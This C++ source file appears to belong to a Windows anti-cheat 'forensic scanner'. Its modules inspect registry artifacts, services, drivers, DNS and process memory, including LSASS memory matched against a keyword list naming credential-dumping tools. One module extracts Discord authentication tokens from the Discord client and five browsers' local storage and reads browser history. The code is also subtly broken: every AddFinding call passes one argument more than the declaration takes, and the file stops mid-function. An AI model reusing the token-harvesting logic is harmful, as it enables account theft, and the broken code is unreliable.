#include "scanner.h"
#include <iphlpapi.h>
#include <setupapi.h>
#include <devguid.h>

#pragma comment(lib, "setupapi.lib")

ForensicScanner::ForensicScanner() {
    hwid = GetHwid();
    timestamp = GetIsoTimestamp();
    scanId = GetScanId();
    targetId = TARGET_ID;
}

ForensicScanner::~ForensicScanner() {}

void ForensicScanner::AddFinding(ModuleResult& result, const std::string& type,
                                  const std::string& path, const std::string& key,
                                  const std::string& value, const std::string& severity,
                                  const std::string& description) {
    Finding f(type, path, key, value, GetIsoTimestamp(), severity, description, result.name, "");
    result.findings.push_back(f);
}

std::vector<ModuleResult> ForensicScanner::RunFullScan() {
    results.clear();
    auto start = std::chrono::high_resolution_clock::now();

    std::cout << "[3X Forensic Scanner v2.0] Starting full scan..." << std::endl;
    std::cout << "Target ID: " << targetId << std::endl;
    std::cout << "Scan ID: " << scanId << std::endl;
    std::cout << "HWID: " << hwid << std::endl;
    std::cout << "Admin: " << (IsAdmin() ? "Yes" : "No") << std::endl;
    std::cout << std::endl;

    // Run all modules
    auto modules = {
        &ForensicScanner::ScanSystemInfo,
        &ForensicScanner::ScanBAM,
        &ForensicScanner::ScanLSASS,
        &ForensicScanner::ScanDNSCache,
        &ForensicScanner::ScanPcaClient,
        &ForensicScanner::ScanKeyAuth,
        &ForensicScanner::ScanSuspiciousFiles,
        &ForensicScanner::ScanServices,
        &ForensicScanner::ScanRegistryArtifacts,
        &ForensicScanner::ScanFileArtifacts,
        &ForensicScanner::ScanMemoryPatterns,
        &ForensicScanner::ScanDiscordTraces,
        &ForensicScanner::ScanDeepTrace,
        &ForensicScanner::ScanNetwork,
        &ForensicScanner::ScanUSBDevices,
        &ForensicScanner::ScanBrowserTraces
    };

    for (auto module : modules) {
        auto modStart = std::chrono::high_resolution_clock::now();
        ModuleResult mr = (this->*module)();
        auto modEnd = std::chrono::high_resolution_clock::now();
        mr.duration_ms = (int)std::chrono::duration_cast<std::chrono::milliseconds>(modEnd - modStart).count();
        results.push_back(mr);

        std::cout << "[" << mr.name << "] " << mr.status 
                  << " | Findings: " << mr.findings.size() 
                  << " | " << mr.duration_ms << "ms" << std::endl;
    }

    auto end = std::chrono::high_resolution_clock::now();
    int totalMs = (int)std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count();

    std::cout << std::endl << "Scan complete. Total time: " << totalMs << "ms" << std::endl;

    auto counts = GetSeverityCounts(results);
    std::cout << "Findings: Critical=" << counts[SEV_CRITICAL] 
              << " High=" << counts[SEV_HIGH]
              << " Medium=" << counts[SEV_MEDIUM]
              << " Low=" << counts[SEV_LOW]
              << " Info=" << counts[SEV_INFO] << std::endl;

    return results;
}

// ==================== SYSTEM INFO ====================
ModuleResult ForensicScanner::ScanSystemInfo() {
    ModuleResult mr("SystemInfo");
    mr.status = "completed";

    // Get CPU info via WMI or registry
    std::string cpuInfo = QueryRegistryValue(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString");
    if (cpuInfo.empty()) cpuInfo = "Unknown";

    // Get RAM info
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    std::stringstream ramSS;
    ramSS << (memStatus.ullTotalPhys / (1024 * 1024 * 1024)) << " GB";

    // Get GPU info via WMI (simplified - just check registry)
    std::string gpuInfo = QueryRegistryValue(HKEY_LOCAL_MACHINE,
        "SYSTEM\\ControlSet001\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
        "DriverDesc");
    if (gpuInfo.empty()) gpuInfo = "Unknown";

    mr.details = "CPU: " + cpuInfo + " | RAM: " + ramSS.str() + " | GPU: " + gpuInfo;

    AddFinding(mr, TYPE_INFO, "", "", cpuInfo, SEV_INFO, "CPU: " + cpuInfo, mr.name);
    AddFinding(mr, TYPE_INFO, "", "", ramSS.str(), SEV_INFO, "RAM: " + ramSS.str(), mr.name);
    AddFinding(mr, TYPE_INFO, "", "", gpuInfo, SEV_INFO, "GPU: " + gpuInfo, mr.name);

    return mr;
}

// ==================== BAM (Background Activity Moderator) ====================
ModuleResult ForensicScanner::ScanBAM() {
    ModuleResult mr("BAM");
    mr.status = "completed";

    // BAM stores execution history in HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings
    std::string bamKey = "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings";
    auto userSIDs = GetRegistrySubKeys(HKEY_LOCAL_MACHINE, bamKey);

    if (userSIDs.empty()) {
        mr.status = "no_data";
        mr.details = "No BAM data found";
        return mr;
    }

    for (const auto& sid : userSIDs) {
        std::string userKey = bamKey + "\\" + sid;
        auto values = GetRegistryValues(HKEY_LOCAL_MACHINE, userKey);
        for (const auto& val : values) {
            std::string path = val.second;
            // Check if path contains cheat indicators
            if (ContainsAny(path, CHEAT_PATH_PATTERNS)) {
                AddFinding(mr, TYPE_BAM_ENTRY, path, userKey + "\\" + val.first, val.second,
                          SEV_HIGH, "BAM execution history contains suspicious path", mr.name);
            }
            // Check for temp/unknown executables
            if (path.find("\\Temp\\") != std::string::npos && 
                (path.find(".exe") != std::string::npos || path.find(".dll") != std::string::npos)) {
                AddFinding(mr, TYPE_BAM_ENTRY, path, userKey + "\\" + val.first, val.second,
                          SEV_MEDIUM, "BAM: Executable run from Temp folder", mr.name);
            }
            // Check for AppData/Local executables
            if (path.find("\\AppData\\") != std::string::npos && 
                path.find(".exe") != std::string::npos) {
                AddFinding(mr, TYPE_BAM_ENTRY, path, userKey + "\\" + val.first, val.second,
                          SEV_LOW, "BAM: Executable run from AppData", mr.name);
            }
        }
    }

    mr.details = "Checked " + std::to_string(userSIDs.size()) + " user profiles in BAM";
    return mr;
}

// ==================== LSASS ====================
ModuleResult ForensicScanner::ScanLSASS() {
    ModuleResult mr("LSASS");
    mr.status = "completed";

    DWORD lsassPid = GetProcessIdByName("lsass.exe");
    if (lsassPid == 0) {
        mr.status = "error";
        mr.details = "lsass.exe not found";
        return mr;
    }

    // Check for processes with handles to LSASS
    auto processes = GetRunningProcesses();
    for (const auto& proc : processes) {
        if (proc.second == lsassPid) continue;
        // Check loaded modules for known injection tools
        auto modules = GetLoadedModules(proc.second);
        for (const auto& mod : modules) {
            if (ContainsAny(mod, CHEAT_PROCESS_PATTERNS)) {
                AddFinding(mr, TYPE_PROCESS_ANOMALY, GetProcessPath(proc.second), "", mod,
                          SEV_CRITICAL, "Process with LSASS access has suspicious module: " + mod, mr.name);
            }
        }
    }

    // Check for Mimikatz-like strings in LSASS memory
    std::vector<std::string> mimikatzPatterns = {
        "mimikatz", "sekurlsa", "kerberos", "wdigest", "tspkg",
        "livessp", "ssp", "msv", "credman", "token", "process",
        "inject", "dump", "lsa", "logon", "password", "hash"
    };

    // Scan LSASS memory for suspicious patterns
    ScanMemoryForPattern(lsassPid, mimikatzPatterns, mr.findings, mr.name);

    // Check for processes with suspicious names near LSASS
    for (const auto& proc : processes) {
        std::string lowerName = ToLower(proc.first);
        if (lowerName.find("mimikatz") != std::string::npos ||
            lowerName.find("pypykatz") != std::string::npos ||
            lowerName.find("lsassy") != std::string::npos) {
            AddFinding(mr, TYPE_PROCESS_ANOMALY, GetProcessPath(proc.second), "", proc.first,
                      SEV_CRITICAL, "Credential dumping tool detected: " + proc.first, mr.name);
        }
    }

    mr.details = "LSASS PID: " + std::to_string(lsassPid);
    return mr;
}

// ==================== DNS CACHE ====================
ModuleResult ForensicScanner::ScanDNSCache() {
    ModuleResult mr("DNSCache");
    mr.status = "completed";

    // Method 1: Use ipconfig /displaydns
    std::string dnsOutput = ExecuteCommand("ipconfig /displaydns");
    if (!dnsOutput.empty()) {
        auto lines = SplitString(dnsOutput, '\n');
        for (const auto& line : lines) {
            std::string trimmed = TrimString(line);
            if (trimmed.find("Record Name") != std::string::npos) {
                size_t pos = trimmed.find(":");
                if (pos != std::string::npos) {
                    std::string domain = TrimString(trimmed.substr(pos + 1));
                    // Check against cheat domains
                    if (ContainsAny(domain, CHEAT_AUTH_DOMAINS)) {
                        AddFinding(mr, TYPE_DNS_INDICATOR, domain, "", domain,
                                  SEV_HIGH, "DNS cache contains cheat auth domain", mr.name);
                    }
                    if (ContainsAny(domain, CHEAT_C2_PATTERNS)) {
                        AddFinding(mr, TYPE_DNS_INDICATOR, domain, "", domain,
                                  SEV_HIGH, "DNS cache contains cheat C2 infrastructure", mr.name);
                    }
                    // Check for known CDN/update patterns
                    if (domain.find("cdn.") != std::string::npos ||
                        domain.find("update.") != std::string::npos ||
                        domain.find("download.") != std::string::npos) {
                        if (ContainsAny(domain, CHEAT_PATH_PATTERNS)) {
                            AddFinding(mr, TYPE_DNS_INDICATOR, domain, "", domain,
                                      SEV_MEDIUM, "DNS cache contains suspicious update/download domain", mr.name);
                        }
                    }
                }
            }
        }
    }

    // Method 2: Check hosts file for cheat domain redirects
    std::string hostsPath = GetWindowsPath() + "\\System32\\drivers\\etc\\hosts";
    if (FileExists(hostsPath)) {
        std::string hostsContent = ReadFile(hostsPath, 1024 * 1024);
        auto lines = SplitString(hostsContent, '\n');
        for (const auto& line : lines) {
            std::string trimmed = TrimString(line);
            if (trimmed.empty() || trimmed[0] == '#') continue;
            if (ContainsAny(trimmed, CHEAT_AUTH_DOMAINS) || ContainsAny(trimmed, CHEAT_C2_PATTERNS)) {
                AddFinding(mr, TYPE_DNS_INDICATOR, hostsPath, "", trimmed,
                          SEV_CRITICAL, "Hosts file contains cheat domain redirect", mr.name);
            }
        }
    }

    mr.details = "DNS cache and hosts file analyzed";
    return mr;
}

// ==================== PcaClient ====================
ModuleResult ForensicScanner::ScanPcaClient() {
    ModuleResult mr("PcaClient");
    mr.status = "completed";

    std::string pcaPath = GetWindowsPath() + "\\appcompat\\pca";
    if (!DirectoryExists(pcaPath)) {
        mr.status = "no_data";
        mr.details = "PcaClient directory not found";
        return mr;
    }

    // Read PcaAppLaunchDic.txt
    std::string launchDic = pcaPath + "\\PcaAppLaunchDic.txt";
    if (FileExists(launchDic)) {
        std::string content = ReadFile(launchDic, 10 * 1024 * 1024);
        auto lines = SplitString(content, '\n');
        for (const auto& line : lines) {
            if (ContainsAny(line, CHEAT_PATH_PATTERNS)) {
                AddFinding(mr, TYPE_PCACLIENT_TRACE, launchDic, "", line,
                          SEV_HIGH, "PcaAppLaunchDic contains suspicious application", mr.name);
            }
            if (line.find("\\Temp\\") != std::string::npos && line.find(".exe") != std::string::npos) {
                AddFinding(mr, TYPE_PCACLIENT_TRACE, launchDic, "", line,
                          SEV_MEDIUM, "PcaAppLaunchDic: Temp executable launched", mr.name);
            }
        }
    }

    // Read PcaGeneralDb0.txt and PcaGeneralDb1.txt
    std::vector<std::string> dbFiles = {
        pcaPath + "\\PcaGeneralDb0.txt",
        pcaPath + "\\PcaGeneralDb1.txt"
    };
    for (const auto& dbFile : dbFiles) {
        if (FileExists(dbFile)) {
            std::string content = ReadFile(dbFile, 10 * 1024 * 1024);
            auto lines = SplitString(content, '\n');
            for (const auto& line : lines) {
                if (ContainsAny(line, CHEAT_PATH_PATTERNS)) {
                    AddFinding(mr, TYPE_PCACLIENT_TRACE, dbFile, "", line,
                              SEV_HIGH, "PcaGeneralDb contains suspicious application", mr.name);
                }
            }
        }
    }

    mr.details = "PcaClient databases analyzed";
    return mr;
}

// ==================== KeyAuth ====================
ModuleResult ForensicScanner::ScanKeyAuth() {
    ModuleResult mr("KeyAuth");
    mr.status = "completed";

    // Check for KeyAuth files
    std::vector<std::string> keyauthFiles = {
        GetSystemPath() + "\\KeyAuth.dll",
        GetSystemPath() + "\\KeyAuth32.dll",
        GetSystemPath() + "\\KeyAuth64.dll",
        GetWindowsPath() + "\\KeyAuth.dll",
        GetTempPathA() + "\\KeyAuth.dll",
        GetTempPathA() + "\\keyauth.dll",
        GetAppDataPath() + "\\KeyAuth.dll",
        GetLocalAppDataPath() + "\\KeyAuth.dll"
    };

    for (const auto& file : keyauthFiles) {
        if (FileExists(file)) {
            AddFinding(mr, TYPE_KEYAUTH_TRACE, file, "", "",
                      SEV_CRITICAL, "KeyAuth DLL found on system", mr.name);
        }
    }

    // Check registry for KeyAuth
    std::vector<std::string> keyauthRegKeys = {
        "SOFTWARE\\KeyAuth",
        "SOFTWARE\\keyauth",
        "SOFTWARE\\KeyAuthApp",
        "SOFTWARE\\keyauthapp"
    };
    for (const auto& key : keyauthRegKeys) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            AddFinding(mr, TYPE_KEYAUTH_TRACE, "", key, "",
                      SEV_CRITICAL, "KeyAuth registry key found", mr.name);
            RegCloseKey(hKey);
        }
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            AddFinding(mr, TYPE_KEYAUTH_TRACE, "", key, "",
                      SEV_CRITICAL, "KeyAuth registry key found (HKLM)", mr.name);
            RegCloseKey(hKey);
        }
    }

    // Check for KeyAuth strings in browser data
    auto browserPaths = GetBrowserLocalStoragePaths();
    for (const auto& path : browserPaths) {
        if (DirectoryExists(path)) {
            auto files = ListFiles(path, "*");
            for (const auto& file : files) {
                std::string content = ReadFile(file, 5 * 1024 * 1024);
                if (content.find("keyauth") != std::string::npos ||
                    content.find("KeyAuth") != std::string::npos ||
                    content.find("api.keyauth") != std::string::npos) {
                    AddFinding(mr, TYPE_KEYAUTH_TRACE, file, "", "",
                              SEV_HIGH, "KeyAuth traces in browser local storage", mr.name);
                }
            }
        }
    }

    // Check DNS cache for KeyAuth domains
    std::string dnsOutput = ExecuteCommand("ipconfig /displaydns");
    if (dnsOutput.find("keyauth") != std::string::npos) {
        AddFinding(mr, TYPE_KEYAUTH_TRACE, "", "", "",
                  SEV_HIGH, "KeyAuth domain found in DNS cache", mr.name);
    }

    mr.details = "KeyAuth traces checked";
    return mr;
}

// ==================== Suspicious/Unsigned Files ====================
ModuleResult ForensicScanner::ScanSuspiciousFiles() {
    ModuleResult mr("SuspiciousFiles");
    mr.status = "completed";

    // Scan system drivers for unsigned/vulnerable ones
    std::string driversPath = GetSystemPath() + "\\drivers";
    if (DirectoryExists(driversPath)) {
        auto drivers = ListFiles(driversPath, "*.sys");
        for (const auto& driver : drivers) {
            std::string driverName = driver.substr(driver.find_last_of("\\") + 1);
            std::string lowerName = ToLower(driverName);

            // Check against known vulnerable drivers
            if (ContainsAny(lowerName, VULNERABLE_DRIVERS)) {
                AddFinding(mr, TYPE_UNSIGNED_DRIVER, driver, "", driverName,
                          SEV_CRITICAL, "Known vulnerable driver detected: " + driverName, mr.name);
            }

            // Check signature
            if (!CheckFileSignature(driver)) {
                AddFinding(mr, TYPE_UNSIGNED_DRIVER, driver, "", driverName,
                          SEV_HIGH, "Unsigned driver: " + driverName, mr.name);
            }
        }
    }

    // Scan temp folder for suspicious executables
    std::string tempPath = GetTempPathA();
    if (DirectoryExists(tempPath)) {
        auto tempFiles = ListFiles(tempPath, "*.exe");
        for (const auto& file : tempFiles) {
            std::string fileName = file.substr(file.find_last_of("\\") + 1);
            if (!CheckFileSignature(file)) {
                AddFinding(mr, TYPE_SUSPICIOUS_FILE, file, "", fileName,
                          SEV_HIGH, "Unsigned executable in Temp: " + fileName, mr.name);
            }
            if (ContainsAny(fileName, CHEAT_PROCESS_PATTERNS)) {
                AddFinding(mr, TYPE_SUSPICIOUS_FILE, file, "", fileName,
                          SEV_CRITICAL, "Suspicious executable in Temp: " + fileName, mr.name);
            }
        }

        auto tempDlls = ListFiles(tempPath, "*.dll");
        for (const auto& file : tempDlls) {
            std::string fileName = file.substr(file.find_last_of("\\") + 1);
            if (!CheckFileSignature(file)) {
                AddFinding(mr, TYPE_SUSPICIOUS_FILE, file, "", fileName,
                          SEV_MEDIUM, "Unsigned DLL in Temp: " + fileName, mr.name);
            }
        }
    }

    // Scan AppData/Local for suspicious executables
    std::string localAppData = GetLocalAppDataPath();
    if (DirectoryExists(localAppData)) {
        ScanDirectoryForPatterns(localAppData, CHEAT_PATH_PATTERNS, mr.findings, mr.name, 2);
    }

    // Scan ProgramData for suspicious files
    std::string programData = GetProgramDataPath();
    if (DirectoryExists(programData)) {
        ScanDirectoryForPatterns(programData, CHEAT_PATH_PATTERNS, mr.findings, mr.name, 2);
    }

    mr.details = "Drivers, temp, and appdata scanned for suspicious files";
    return mr;
}

// ==================== SERVICES ====================
ModuleResult ForensicScanner::ScanServices() {
    ModuleResult mr("Services");
    mr.status = "completed";

    auto services = GetServices();

    // Check specific services
    std::map<std::string, std::string> criticalServices = {
        {"PcaSvc", "Program Compatibility Assistant"},
        {"DPS", "Diagnostic Policy Service"},
        {"SysMain", "SysMain (SuperFetch)"},
        {"WSearch", "Windows Search"},
        {"EventLog", "Windows Event Log"},
        {"winmgmt", "WMI"},
        {"CryptSvc", "Cryptographic Services"},
        {"DcomLaunch", "DCOM Server Process Launcher"},
        {"RpcSs", "RPC"},
        {"PlugPlay", "Plug and Play"}
    };

    for (const auto& svc : criticalServices) {
        std::string status = GetServiceStatus(svc.first);
        if (status == "STOPPED" || status == "DISABLED") {
            AddFinding(mr, TYPE_SERVICE_ANOMALY, "", svc.first, status,
                      SEV_HIGH, "Critical service stopped: " + svc.second + " (" + svc.first + ")", mr.name);
        }
    }

    // Check for suspicious service names
    for (const auto& svc : services) {
        if (ContainsAny(svc.first, CHEAT_PROCESS_PATTERNS)) {
            AddFinding(mr, TYPE_SERVICE_ANOMALY, "", svc.first, svc.second,
                      SEV_CRITICAL, "Suspicious service name: " + svc.first, mr.name);
        }
    }

    // Check for services with unsigned executables
    for (const auto& svc : services) {
        // Try to find service executable path from registry
        std::string svcPath = QueryRegistryValue(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services\\" + svc.first, "ImagePath");
        if (!svcPath.empty()) {
            // Clean up path (remove quotes, parameters)
            svcPath = TrimString(svcPath);
            if (svcPath.front() == '"') svcPath = svcPath.substr(1);
            size_t quotePos = svcPath.find('"');
            if (quotePos != std::string::npos) svcPath = svcPath.substr(0, quotePos);

            if (FileExists(svcPath) && !CheckFileSignature(svcPath)) {
                AddFinding(mr, TYPE_SERVICE_ANOMALY, svcPath, svc.first, svc.second,
                          SEV_HIGH, "Service with unsigned executable: " + svc.first, mr.name);
            }
        }
    }

    mr.details = std::to_string(services.size()) + " services checked";
    return mr;
}

// ==================== REGISTRY ARTIFACTS ====================
ModuleResult ForensicScanner::ScanRegistryArtifacts() {
    ModuleResult mr("RegistryArtifacts");
    mr.status = "completed";

    // Check uninstall entries for cheat software
    std::vector<std::string> uninstallKeys = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    };

    for (const auto& key : uninstallKeys) {
        auto subKeys = GetRegistrySubKeys(HKEY_LOCAL_MACHINE, key);
        for (const auto& subKey : subKeys) {
            std::string fullKey = key + "\\" + subKey;
            std::string displayName = QueryRegistryValue(HKEY_LOCAL_MACHINE, fullKey, "DisplayName");
            std::string installLocation = QueryRegistryValue(HKEY_LOCAL_MACHINE, fullKey, "InstallLocation");

            if (ContainsAny(displayName, CHEAT_PATH_PATTERNS) || ContainsAny(displayName, CHEAT_REG_PATTERNS)) {
                AddFinding(mr, TYPE_REGISTRY_ARTIFACT, installLocation, fullKey, displayName,
                          SEV_HIGH, "Uninstall entry for suspicious software: " + displayName, mr.name);
            }
            if (ContainsAny(installLocation, CHEAT_PATH_PATTERNS)) {
                AddFinding(mr, TYPE_REGISTRY_ARTIFACT, installLocation, fullKey, displayName,
                          SEV_HIGH, "Suspicious install location: " + installLocation, mr.name);
            }
        }
    }

    // Check UserAssist for suspicious executables
    std::string userAssistKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist";
    auto userAssistGUIDs = GetRegistrySubKeys(HKEY_CURRENT_USER, userAssistKey);
    for (const auto& guid : userAssistGUIDs) {
        std::string guidKey = userAssistKey + "\\" + guid + "\\Count";
        auto values = GetRegistryValues(HKEY_CURRENT_USER, guidKey);
        for (const auto& val : values) {
            // UserAssist values are ROT13 encoded, but we can still check for patterns
            std::string decoded = val.first;
            // Simple ROT13 decode
            for (char& c : decoded) {
                if (c >= 'a' && c <= 'z') c = 'a' + (c - 'a' + 13) % 26;
                else if (c >= 'A' && c <= 'Z') c = 'A' + (c - 'A' + 13) % 26;
            }
            if (ContainsAny(decoded, CHEAT_PATH_PATTERNS)) {
                AddFinding(mr, TYPE_REGISTRY_ARTIFACT, "", guidKey + "\\" + val.first, val.second,
                          SEV_HIGH, "UserAssist contains suspicious application", mr.name);
            }
        }
    }

    // Check Run keys for suspicious entries
    std::vector<std::string> runKeys = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    };
    for (const auto& key : runKeys) {
        auto values = GetRegistryValues(HKEY_CURRENT_USER, key);
        for (const auto& val : values) {
            if (ContainsAny(val.second, CHEAT_PATH_PATTERNS)) {
                AddFinding(mr, TYPE_REGISTRY_ARTIFACT, val.second, key + "\\" + val.first, val.second,
                          SEV_HIGH, "Run key contains suspicious entry: " + val.first, mr.name);
            }
        }
        values = GetRegistryValues(HKEY_LOCAL_MACHINE, key);
        for (const auto& val : values) {
            if (ContainsAny(val.second, CHEAT_PATH_PATTERNS)) {
                AddFinding(mr, TYPE_REGISTRY_ARTIFACT, val.second, key + "\\" + val.first, val.second,
                          SEV_HIGH, "Run key (HKLM) contains suspicious entry: " + val.first, mr.name);
            }
        }
    }

    // Check Shellbags for suspicious paths
    std::string shellbagsKey = "SOFTWARE\\Microsoft\\Windows\\Shell\\BagMRU";
    ScanRegistryForPatterns(HKEY_CURRENT_USER, shellbagsKey, CHEAT_PATH_PATTERNS, mr.findings, mr.name, 3);

    mr.details = "Registry artifacts scanned";
    return mr;
}

// ==================== FILE ARTIFACTS ====================
ModuleResult ForensicScanner::ScanFileArtifacts() {
    ModuleResult mr("FileArtifacts");
    mr.status = "completed";

    // Check known cheat file locations
    std::vector<std::string> cheatPaths = {
        GetTempPathA(),
        GetAppDataPath(),
        GetLocalAppDataPath(),
        GetProgramDataPath(),
        GetWindowsPath() + "\\Temp",
        GetSystemPath() + "\\drivers"
    };

    for (const auto& path : cheatPaths) {
        if (DirectoryExists(path)) {
            ScanDirectoryForPatterns(path, CHEAT_PATH_PATTERNS, mr.findings, mr.name, 2);
        }
    }

    // Check for known cheat file names
    std::vector<std::string> knownCheatFiles = {
        GetTempPathA() + "\\injector.exe",
        GetTempPathA() + "\\loader.exe",
        GetTempPathA() + "\\bypass.exe",
        GetTempPathA() + "\\spoofer.exe",
        GetAppDataPath() + "\\cheat.exe",
        GetAppDataPath() + "\\hack.exe",
        GetLocalAppDataPath() + "\\modmenu.exe",
        GetLocalAppDataPath() + "\\executor.exe"
    };

    for (const auto& file : knownCheatFiles) {
        if (FileExists(file)) {
            AddFinding(mr, TYPE_SUSPICIOUS_FILE, file, "", "",
                      SEV_CRITICAL, "Known cheat file found: " + file, mr.name);
        }
    }

    // Check for log files that might contain cheat traces
    std::vector<std::string> logPaths = {
        GetTempPathA() + "\\*.log",
        GetAppDataPath() + "\\*.log",
        GetLocalAppDataPath() + "\\*.log"
    };

    mr.details = "File artifacts scanned";
    return mr;
}

// ==================== MEMORY PATTERNS ====================
ModuleResult ForensicScanner::ScanMemoryPatterns() {
    ModuleResult mr("MemoryPatterns");
    mr.status = "completed";

    auto processes = GetRunningProcesses();
    int scanned = 0;

    for (const auto& proc : processes) {
        std::string lowerName = ToLower(proc.first);

        // Skip system processes
        if (lowerName == "system" || lowerName == "system idle process" ||
            lowerName == "registry" || lowerName == "smss.exe" ||
            lowerName == "csrss.exe" || lowerName == "services.exe" ||
            lowerName == "lsass.exe" || lowerName == "svchost.exe" ||
            lowerName == "winlogon.exe" || lowerName == "wininit.exe") {
            continue;
        }

        // Scan suspicious processes
        if (ContainsAny(proc.first, CHEAT_PROCESS_PATTERNS)) {
            ScanMemoryForPattern(proc.second, CHEAT_MEM_PATTERNS, mr.findings, mr.name);
            scanned++;
        }

        // Scan all processes for cheat memory patterns (limited)
        if (scanned < 20) { // Limit to avoid excessive scanning
            ScanMemoryForPattern(proc.second, CHEAT_MEM_PATTERNS, mr.findings, mr.name);
            scanned++;
        }
    }

    mr.details = std::to_string(scanned) + " processes scanned for memory patterns";
    return mr;
}

// ==================== DISCORD TRACES ====================
ModuleResult ForensicScanner::ScanDiscordTraces() {
    ModuleResult mr("DiscordTraces");
    mr.status = "completed";

    // Check if Discord is running
    bool discordRunning = IsProcessRunning("Discord.exe") || IsProcessRunning("DiscordPTB.exe") ||
                          IsProcessRunning("DiscordCanary.exe") || IsProcessRunning("DiscordDevelopment.exe");

    if (discordRunning) {
        AddFinding(mr, TYPE_DISCORD_TRACE, "", "", "",
                  SEV_INFO, "Discord client is running", mr.name);
    }

    // Extract Discord tokens from browser data
    std::vector<std::string> allTokens;

    // Discord client local storage
    std::string discordLocalStorage = GetAppDataPath() + "\\Discord\\Local Storage\\leveldb";
    if (DirectoryExists(discordLocalStorage)) {
        auto tokens = ExtractDiscordTokensFromDirectory(discordLocalStorage);
        allTokens.insert(allTokens.end(), tokens.begin(), tokens.end());
    }

    // Chrome
    std::string chromeStorage = GetLocalAppDataPath() + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb";
    if (DirectoryExists(chromeStorage)) {
        auto tokens = ExtractDiscordTokensFromDirectory(chromeStorage);
        allTokens.insert(allTokens.end(), tokens.begin(), tokens.end());
    }

    // Edge
    std::string edgeStorage = GetLocalAppDataPath() + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb";
    if (DirectoryExists(edgeStorage)) {
        auto tokens = ExtractDiscordTokensFromDirectory(edgeStorage);
        allTokens.insert(allTokens.end(), tokens.begin(), tokens.end());
    }

    // Brave
    std::string braveStorage = GetLocalAppDataPath() + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb";
    if (DirectoryExists(braveStorage)) {
        auto tokens = ExtractDiscordTokensFromDirectory(braveStorage);
        allTokens.insert(allTokens.end(), tokens.begin(), tokens.end());
    }

    // Firefox
    std::string firefoxProfiles = GetAppDataPath() + "\\Mozilla\\Firefox\\Profiles";
    if (DirectoryExists(firefoxProfiles)) {
        auto profiles = ListDirectories(firefoxProfiles);
        for (const auto& profile : profiles) {
            auto tokens = ExtractDiscordTokensFromDirectory(profile);
            allTokens.insert(allTokens.end(), tokens.begin(), tokens.end());
        }
    }

    // Opera
    std::string operaStorage = GetAppDataPath() + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb";
    if (DirectoryExists(operaStorage)) {
        auto tokens = ExtractDiscordTokensFromDirectory(operaStorage);
        allTokens.insert(allTokens.end(), tokens.begin(), tokens.end());
    }

    // Deduplicate tokens
    std::set<std::string> uniqueTokens(allTokens.begin(), allTokens.end());

    for (const auto& token : uniqueTokens) {
        AddFinding(mr, TYPE_DISCORD_TRACE, "", "", token.substr(0, 10) + "...",
                  SEV_CRITICAL, "Discord token extracted from local storage", mr.name);
    }

    // Check browser history for cheat Discord server invites
    auto historyPaths = GetBrowserHistoryPaths();
    for (const auto& path : historyPaths) {
        if (FileExists(path)) {
            std::string content = ReadFile(path, 50 * 1024 * 1024);
            for (const auto& pattern : CHEAT_DISCORD_PATTERNS) {
                if (content.find(pattern) != std::string::npos) {
                    AddFinding(mr, TYPE_DISCORD_TRACE, path, "", pattern,
                              SEV_HIGH, "Cheat Discord server invite found in browser history", mr.name);
                }
            }
        }
    }

    mr.details = std::to_string(uniqueTokens.size()) + " Discord tokens extracted";
    return mr;
}

// ==================== DEEP TRACE ====================
ModuleResult ForensicScanner::ScanDeepTrace() {
    ModuleResult mr("DeepTrace");
    mr.status = "completed";

    // Run all deep trace detection functions
    auto antiForensic = DetectAntiForensicTraces();
    auto timestamps = DetectTimestampManipulation();
    auto usn = DetectUSNJournalAnomalies();
    auto eventLogs = DetectEventLogClearing();
    auto prefetch = DetectPrefetchGaps();
    auto registryDel = DetectRegistryDeletionPatterns();
    auto staggered = DetectStaggeredDeletes();
    auto selective = DetectSelectiveCleanup();
    auto explorer = DetectExplorerRestart();
    auto etw = DetectETWDisablement();
    auto wmi = DetectWMIDisablement();
    auto services = DetectServiceTampering();

    // Add all findings
    for (const auto& f : antiForensic) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : timestamps) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : usn) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : eventLogs) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : prefetch) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : registryDel) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : staggered) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : selective) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : explorer) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : etw) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
    for (const auto& f : wmi) { Finding cf = f; cf.module = mr.name; mr.findings.push_back(cf); }
